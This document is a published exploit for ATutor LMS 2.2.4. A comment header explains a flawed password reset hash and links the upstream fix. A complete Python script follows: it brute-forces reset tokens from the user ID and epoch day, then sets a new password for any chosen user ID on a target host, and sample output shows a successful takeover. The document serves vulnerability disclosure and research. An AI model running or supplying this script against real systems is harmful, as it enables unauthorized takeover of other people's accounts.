# Exploit Title:    ATutor LMS 2.2.4 - Weak Password Reset Hash
# Date:             2020-05-05
# Exploit Author:   Hodorsec
# Version:          2.2.4
# Software Link:    https://atutor.github.io/atutor/downloads.html
# Vendor Homepage:  https://atutor.github.io
# Tested on:        Debian 10 x64 - PHP 7.3.15-3

# Problem:
# While the original intention of the program was to probably concatenate strings as indicated for the $hash value, this doesn't happen.
# Instead, due to the left-associativity of the "+" operator, the integers of "id" and "g" are added first.
# Lastly, the password gets added as integer as well via the "h" SHA1 hashed password, while a SHA1 password doesn't consist of only integers.
#
# Analysis:
# During analysis, it appeared ONLY the first readable numeric digits are added from the SHA1 hash. 
# Numeric digits at the beginning of a random SHA1 string, are being added to the variables "id" and "h". 
# This might have an impact on many requests, if a large numeric prefix is used in a SHA1 hash.
#
# Vulnerability:
# A valid user ID, the UNIX Epoch in days of maximum +2 and a generated number would be sufficient to generate valid hash bits.
# The hash bits could be attempted to send to the webserver, and if the content contains a valid "change your password" dialog, the attack was successful.
#
# Impact:
# This means any malicious attacker could modify the password of every user, issueing a maximum of 100 requests per user ID.
#
# Fix:
# Appears to be already fixed on the Master branch on Github, however: the 2.2.4 "tar.gz" still contains the unfixed version of "password_reminder.php"
#
# Github details: 
# https://github.com/atutor/ATutor/issues/177
# https://github.com/atutor/ATutor/commit/557dc83071ec36c5ca22a1ea08d57778283905ca
#
# Reproduction:
# EXAMPLE
# $ python3 poc_atutor_2.2.4_iterate_hashbits.py http 192.168.252.13 80 /ATutor 1 2 password
# [*] Issueing password change requests to URL: http://192.168.252.13:80/ATutor/password_reminder.php?id=1&g=18385&h=6d520a1dabb8ae6
# [*] Issueing password change requests to URL: http://192.168.252.13:80/ATutor/password_reminder.php?id=1&g=18385&h=c3300a342a267a4
# [*] Issueing password change requests to URL: http://192.168.252.13:80/ATutor/password_reminder.php?id=1&g=18385&h=cd255501ba0a052
# [*] Issueing password change requests to URL: http://192.168.252.13:80/ATutor/password_reminder.php?id=1&g=18385&h=1a9df2a3fad2f0c
# [*] Issueing password change requests to URL: http://192.168.252.13:80/ATutor/password_reminder.php?id=1&g=18385&h=1450a1414a4107e
# [*] Issueing password change requests to URL: http://192.168.252.13:80/ATutor/password_reminder.php?id=1&g=18385&h=83618d638c3b1fa
#
# [*] SUCCESS: Hashbit 83618d638c3b1fa allows changing password for user ID 1 using 18385 for Epoch days
# [*] Used 6 number of requests
#
# [*] Changing password...
# [*] Password changed successfully!

#!/usr/bin/python3
import hashlib,string,itertools,re,sys
import requests
import urllib3
import os
import time
import sys
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 3

# URL
urlpage = "/password_reminder.php"

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# Set optional headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

def gen_code(id, epoch_day, digits):
    """ Generate a hash_bit, substring of a SHA1 hash based on 'id', 'g' (epoch day) and SHA1 raw-hashed password
    94        $hash = sha1($_REQUEST['id'] + $_REQUEST['g'] + $row['password']);
    95      $hash_bit = substr($hash, 5, 15); """
    codes = []
    chars = range(0,10 ** digits)                                       # Range of numeric digits to use for guessing the SHA1 prefix
    for num in chars:
        to_hash = str(id + epoch_day + num)                             # Only checks on the first set of numeric occurences in the SHA1 hash
        hash_bit = hashlib.sha1(to_hash.encode()).hexdigest()[5:5+15]   # Hash it, Python equivalent of PHP substr(5,15)
        codes.append(hash_bit)                                          # Add the hashbit to the array for testing later on
    return codes

def iterate_hashbits(method, host, port, prefix, id, digits):
    """ Set epochs with a maximum of today + 2
    75  //check if expired
    76  $current = intval(((time()/60)/60)/24);
    77  $expiry_date =  $_REQUEST['g'] + AT_PASSWORD_REMINDER_EXPIRY; //2 days after creation """
    current_epoch_days = int(((int(time.time()) / 60) / 60) / 24)       # Calculate current Epoch in days
    max_epoch_days = int(current_epoch_days + 2)                        # Maximum Epoch in days, as hardcoded by Atutor
    
    # Set initial variables
    headers = http_headers()                                            # Reuse the static headers, due to odd behaviour of Atutor changing user-agent between requests
    txt_pass_change = "Enter a new password for your account"           # Text to check later if attempt was successfull
    count = 0

    # Iterate between today and today + 2
    # Iteration of hashbits
    for epoch_day in range(current_epoch_days, max_epoch_days + 1):     # Add one to include stop value for range
        codes = gen_code(id, epoch_day, digits)
        for code in codes:
            url = method + "://" + host + ":" + port + prefix + urlpage + "?id=" + str(id) + "&g=" + str(epoch_day) + "&h=" + code
            print("[*] Issueing password change requests to URL: " + url)

            try:
                r = requests.get(url, allow_redirects=False, headers=headers, verify=False, timeout=timeout)
                count += 1
            except requests.exceptions.Timeout:
                print("[!] Timeout error\n")
            except requests.exceptions.TooManyRedirects:
                print("[!] Too many redirects\n")
            except requests.exceptions.ConnectionError:
                print("[!] Not able to connect to URL\n")
            except requests.exceptions.RequestException as e:
                print("[!] " + e)
            except requests.exceptions.HTTPError as e:
                print("[!] Failed with error code - " + e.code + "\n")
            except KeyboardInterrupt:
                keyboard_interrupt()

            if txt_pass_change in r.text:
                print("\n[*] SUCCESS: Hashbit " + code + " allows changing password for user ID " + str(id) + " using " + str(epoch_day) + " for Epoch days")
                print("[*] Used " + str(count) + " number of requests\n")
                return [code, epoch_day]
            elif int(r.status_code) != 200:
                print("\n[!] FAIL: " + url + " doesn't seem to respond correctly.\n")
                exit(-1)
        print("\n[!] FAIL: Code not found, something went wrong.\n")
        exit(-1)

def change_pass(method, host, port, prefix, id, code, epoch_day, password):
    """ Set a new password with a valid hashbit as code
    97      if ($_REQUEST['h'] !== $hash_bit) {
    98          $msg->addError('INVALID_LINK');
    99      } else if (($_REQUEST['h'] == $hash_bit) && !isset($_POST['form_change'])) {
    100             $savant->assign('id', $_REQUEST['id']);
    101             $savant->assign('g', $_REQUEST['g']);
    102             $savant->assign('h', $_REQUEST['h']);
    103             $savant->display('password_change.tmpl.php');
    104         }
    """    
    print("[*] Changing password...")
    headers = http_headers()
    url = method + "://" + host + ":" + port + prefix + urlpage
    sha1_pass = hashlib.sha1(password.encode()).hexdigest()
    post_data = {'form_change':'true',
                'id':str(id),
                'h':code,
                'g':str(epoch_day),
                'form_password_hidden':sha1_pass,
                'submit':'Submit'}
    
    try:
        r = requests.post(url, data=post_data, headers=headers, verify=False, timeout=timeout)
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
    except KeyboardInterrupt:
        keyboard_interrupt()

    if 'changed' in r.text:
        print("[*] Password changed successfully!\n")
        exit(1)
    else:
        print("[!] Something went wrong changing password.\n")
        exit(-1)

def main():
    if len(sys.argv) != 8:
        print("[+] Usage: " + sys.argv[0] + " <http/https> <host> <port> <url_prefix> <user_id> <digits> <password>\n")
        print("[+] Eg: " + sys.argv[0] + " http 192.168.11.1 80 /ATutor 1 2 Password12345")
        print("[+] Eg: " + sys.argv[0] + " https yourlocalserver.local 443 / 3 4 Someotherpassword\n")
        print("[+] Use the <digits> parameters with caution due to possible excessive amounts of requests, uses 'digit ^ 10' amount of requests. Value 2 would be a nice value to start with.\n")
        exit(-1)

    # Set variables
    method = str(sys.argv[1])
    host = str(sys.argv[2])
    port = str(sys.argv[3])
    url_prefix = str(sys.argv[4])
    id = int(sys.argv[5])
    digits = int(sys.argv[6])
    password = str(sys.argv[7])

    # Iterate through bits of hashes
    code_epoch = iterate_hashbits(method, host, port, url_prefix, id, digits)
    code = code_epoch[0]
    epoch_day = code_epoch[1]
    change_pass(method, host, port, url_prefix, id, code, epoch_day, password)

if __name__ == "__main__":
    main()
